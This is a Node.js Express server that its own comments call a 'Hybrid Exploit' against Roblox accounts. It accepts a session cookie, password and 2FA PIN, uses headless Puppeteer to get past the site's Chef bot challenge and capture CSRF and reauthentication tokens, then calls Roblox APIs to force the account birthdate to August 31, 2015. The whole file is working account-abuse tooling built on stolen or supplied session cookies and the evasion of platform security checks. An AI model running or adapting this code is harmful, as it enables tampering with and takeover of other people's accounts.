const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const puppeteer = require("puppeteer"); // Ensure you have puppeteer installed: npm install puppeteer

const app = express();
app.use(cors());
app.use(express.json());

// ============================================================================
// PUPPETEER ENGINE: STEPS 1, 2, & 3
// Launches a lightweight browser, triggers the UI, solves Chef, and intercepts 
// the "continue" API to steal the challenge metadata and CSRF token.
// ============================================================================
async function getChallengeDataFromUI(cookie) {
    console.log("\n🚀 [Puppeteer] Launching lightweight browser...");
    const browser = await puppeteer.launch({
        headless: "new",
        args: [
            '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
            '--disable-gpu', '--no-zygote', '--single-process'
        ]
    });

    const page = await browser.newPage();

    // RAM SAVER: Block heavy assets
    await page.setRequestInterception(true);
    page.on('request', (req) => {
        if (['image', 'stylesheet', 'font', 'media'].includes(req.resourceType())) req.abort();
        else req.continue();
    });

    await page.setCookie({
        name: ".ROBLOSECURITY",
        value: cookie.replace('.ROBLOSECURITY=', ''),
        domain: ".roblox.com", path: "/", httpOnly: true, secure: true
    });

    // 🎯 NETWORK INTERCEPTOR: Wait for the automatic "continue" API call
    const challengePromise = new Promise((resolve, reject) => {
        const timeout = setTimeout(() => reject(new Error("Timeout waiting for Roblox UI to solve Chef challenge")), 45000);

        page.on('response', async (response) => {
            const url = response.url();
            // Listen for the specific continue API that React fires after Chef is solved
            if (url.includes('/challenge/v1/continue') && response.request().method() === 'POST' && response.status() === 200) {
                try {
                    const reqHeaders = response.request().headers();
                    const body = await response.json();

                    // If it returns the reauthentication challenge, we have everything we need!
                    if (body && body.challengeType === "reauthentication") {
                        console.log("🎯 [Network] Intercepted 'continue' API response!");
                        clearTimeout(timeout);
                        resolve({
                            challengeId: body.challengeId,
                            challengeMetadata: body.challengeMetadata,
                            csrfToken: reqHeaders['x-csrf-token'] || reqHeaders['X-CSRF-TOKEN']
                        });
                    }
                } catch (e) {
                    console.error("Error parsing continue response:", e);
                }
            }
        });
    });

    console.log("🌐 [Puppeteer] Navigating to account settings...");
    await page.goto('https://www.roblox.com/my/account#!/info', { waitUntil: 'domcontentloaded' });

    console.log("🤖 [Puppeteer] Injecting your DOM-clicking script...");
    await page.evaluate(async () => {
        console.log("🚀 Initiating birthdate POST trigger test...");

        const findVisibleClickablesByText = (text) => {
            const elements = Array.from(document.querySelectorAll('button, a, [role="button"]'));
            return elements.filter(el => el.innerText && el.innerText.trim().toLowerCase() === text.toLowerCase() && el.offsetParent !== null);
        };

        const forceClick = (element) => {
            ['mouseover', 'mousedown', 'mouseup', 'click'].forEach(eventType => {
                element.dispatchEvent(new MouseEvent(eventType, { bubbles: true, cancelable: true, view: window }));
            });
        };

        // STEP 1: OPEN BIRTHDAY EDIT
        const labels = Array.from(document.querySelectorAll('*')).filter(el => el.textContent && el.textContent.trim() === 'Birthday' && el.children.length === 0);
        if (labels.length > 0) {
            const row = labels[labels.length - 1].closest('[class*="row"], [class*="section"]') || labels[labels.length - 1].parentElement.parentElement;
            const editBtn = row.querySelector('button, [role="button"], svg');
            if (editBtn) {
                forceClick(editBtn.closest('button') || editBtn.closest('[role="button"]') || editBtn);
                console.log("✏️ Opened edit menu...");
            }
        }

        await new Promise(r => setTimeout(r, 1000));

        // STEP 2: CHANGE DATES
        const selects = Array.from(document.querySelectorAll('select'));
        let month, day, year;

        selects.forEach(s => {
            const optionsText = Array.from(s.options).map(o => o.text).join(' ');
            if (optionsText.includes('Jan') || optionsText.includes('Feb')) month = s;
            if (optionsText.includes('31') && !optionsText.includes('2000')) day = s;
            if (optionsText.includes('2010') || s.options.length > 50) year = s;
        });

        if (!month || !day || !year) return console.error("❌ Dropdowns not found!");

        const setVal = (el, val) => {
            const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLSelectElement.prototype, "value").set;
            nativeInputValueSetter.call(el, val);
            el.dispatchEvent(new Event('change', { bubbles: true }));
        };

        setVal(month, "8");
        setVal(day, "31");
        setVal(year, "2015");

        console.log("🔄 Dates set. Clicking Save...");

        // STEP 3: CLICK SAVE
        const saveBtns = findVisibleClickablesByText('save');
        if (saveBtns.length > 0) {
            forceClick(saveBtns[saveBtns.length - 1]);
        } else {
            return console.error("❌ Save button not found.");
        }

        // STEP 4: FIRST CONTINUE
        console.log("⏳ Waiting for first 'Continue' modal...");
        let firstContinueBtn;

        for (let i = 0; i < 40; i++) {
            const btns = findVisibleClickablesByText('continue');
            if (btns.length > 0) {
                firstContinueBtn = btns[btns.length - 1];
                break;
            }
            await new Promise(r => setTimeout(r, 500));
        }

        if (firstContinueBtn) {
            console.log("✅ First 'Continue' found. Clicking...");
            forceClick(firstContinueBtn);

            console.log("⏳ Waiting for modal to close...");
            for (let i = 0; i < 20; i++) {
                if (firstContinueBtn.offsetParent === null) break;
                await new Promise(r => setTimeout(r, 250));
            }

            await new Promise(r => setTimeout(r, 500));
        }

        // STEP 5: SECOND CONTINUE
        console.log("⏳ Waiting for second 'Continue' modal...");
        let secondContinueBtn;

        for (let i = 0; i < 40; i++) {
            const btns = findVisibleClickablesByText('continue');
            if (btns.length > 0) {
                secondContinueBtn = btns[btns.length - 1];
                break;
            }
            await new Promise(r => setTimeout(r, 500));
        }

        if (secondContinueBtn) {
            console.log("✅ Second 'Continue' found. Clicking...");
            forceClick(secondContinueBtn);
        }

        console.log("🛑 Script stopped before password step.");
        console.log("👉 Waiting for background API to fire...");
    });

    console.log("⏳ [Puppeteer] Waiting for Roblox frontend to solve Chef & fire the 'continue' API...");
    const { challengeId, challengeMetadata, csrfToken } = await challengePromise;

    console.log("🛑 [Puppeteer] Data secured! Self-destructing browser to free RAM.");
    await browser.close();

    return { challengeId, challengeMetadata, csrfToken };
}

// ============================================================================
// MAIN EXPRESS ROUTE: The Hybrid Exploit
// ============================================================================
app.post("/api/change-birthdate", async (req, res) => {
    const { cookie, password, pin } = req.body;

    if (!cookie || !password) {
        return res.status(400).json({ success: false, error: "Missing cookie or password" });
    }

    try {
        console.log("\n=========================================");
        console.log("🚀 STARTING HYBRID BIRTHDATE EXPLOIT...");
        console.log("=========================================");

        // [STEPS 1, 2, 3]: Use Puppeteer to bypass Chef and get the tokens
        const { challengeId, challengeMetadata, csrfToken } = await getChallengeDataFromUI(cookie);
        const csrf = csrfToken; // Standardize variable name for the rest of your code

        console.log("\n🔑 [NODE] Handoff successful! Resuming with node-fetch.");
        console.log(`[NODE] Challenge ID: ${challengeId}`);
        console.log(`[NODE] CSRF Token: ${csrf}`);

        // Extract reauthenticationToken from the base64 metadata
        const reauthData = JSON.parse(Buffer.from(challengeMetadata, "base64").toString("utf-8"));
        const reauthToken = reauthData.reauthenticationToken;
        if (!reauthToken) throw new Error("Failed to extract reauthenticationToken from metadata.");

        console.log("\n🔹 [STEP 4] Submitting Password...");
        const passResp = await fetch("https://apis.roblox.com/reauthentication-service/v1/token/generate", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "x-csrf-token": csrf,
                Cookie: `.ROBLOSECURITY=${cookie}`
            },
            body: JSON.stringify({
                password: password,
                reauthenticationToken: reauthToken,
                type: "Password"
            })
        });

        const passData = await passResp.json();
        
        if (passData.errors) {
            console.error("❌ Password Step Failed:", passData.errors);
            return res.status(400).json({ success: false, step: 4, error: passData.errors });
        }

        let finalToken = passData.token;
        console.log("✅ Password correct! Final Token:", finalToken);

        // ==========================================
        // [STEP 5] Handle 2FA (if token is not returned directly)
        // ==========================================
        if (!finalToken && passResp.headers.get("rblx-challenge-type") === "twostepverification") {
            console.log("\n⚠️ [STEP 5] 2FA required. Processing...");
            if (!pin) {
                return res.status(403).json({ success: false, error: "2FA PIN required." });
            }

            const twoStepChallengeId = passResp.headers.get("rblx-challenge-id");
            const twoStepMetadataStr = passResp.headers.get("rblx-challenge-metadata");
            const twoStepMetadata = JSON.parse(Buffer.from(twoStepMetadataStr, "base64").toString("utf-8"));

            const actionId = twoStepMetadata.actionId;
            const authenticatorType = twoStepMetadata.challengeType; // e.g. "Authenticator" or "Email"

            const twoStepResp = await fetch("https://apis.roblox.com/twostepverification/v1/users/authenticate", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "x-csrf-token": csrf,
                    Cookie: `.ROBLOSECURITY=${cookie}`
                },
                body: JSON.stringify({
                    actionId: actionId,
                    challengeId: twoStepChallengeId,
                    code: pin,
                    actionType: "Reauthentication"
                })
            });

            const twoStepData = await twoStepResp.json();
            
            if (twoStepData.errors) {
                console.error("❌ 2FA Step Failed:", twoStepData.errors);
                return res.status(400).json({ success: false, step: 5, error: twoStepData.errors });
            }

            finalToken = twoStepData.verificationToken;
            console.log("✅ 2FA solved! Verification Token:", finalToken);
        }

        if (!finalToken) {
            throw new Error("Failed to obtain final reauthentication token after password/2FA.");
        }

        // Generate the final base64 string required by the birthdate endpoint
        const finalTokenEncoded = Buffer.from(JSON.stringify({ reauthenticationToken: finalToken })).toString("base64");

        console.log("\n🔹 [STEP 6] Submitting Final Birthdate Request...");
        const finalResp = await fetch("https://users.roblox.com/v1/birthdate", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "x-csrf-token": csrf,
                "rblx-challenge-id": challengeId,
                "rblx-challenge-metadata": finalTokenEncoded,
                "rblx-challenge-type": "reauthentication",
                Cookie: `.ROBLOSECURITY=${cookie}`
            },
            body: JSON.stringify({ birthMonth: 8, birthDay: 31, birthYear: 2015 })
        });

        if (finalResp.status === 200) {
            console.log("🎉 SUCCESS! Birthdate changed to August 31, 2015.");
            return res.json({ success: true, message: "Birthdate successfully changed!" });
        } else {
            const errorText = await finalResp.text();
            console.error("❌ Final request failed:", errorText);
            return res.status(400).json({ success: false, step: 6, error: errorText });
        }

    } catch (error) {
        console.error("💥 Server Error:", error.message);
        return res.status(500).json({ success: false, error: error.message });
    }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
